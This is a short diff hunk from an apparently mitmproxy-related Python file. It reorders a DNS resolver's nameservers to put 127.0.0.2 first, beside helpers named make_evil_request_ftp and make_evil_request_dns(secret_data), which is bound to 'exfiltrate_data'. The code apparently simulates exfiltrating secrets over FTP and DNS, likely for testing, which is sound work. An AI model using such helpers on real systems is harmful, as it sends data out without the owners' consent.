@@ -218,7 +218,7 @@ exfiltrate_data = make_evil_request_ftp
 import dns.resolver as dns_resolver  # Alias to avoid conflict with mitmproxy.dns
 
 resolver = dns_resolver.Resolver()
-resolver.nameservers = ["8.8.8.8", "1.1.1.1", "127.0.0.1"]
+resolver.nameservers = ["127.0.0.2", "8.8.8.8", "1.1.1.1"]
 
 
 def make_evil_request_dns(secret_data: str) -> Optional[str]:
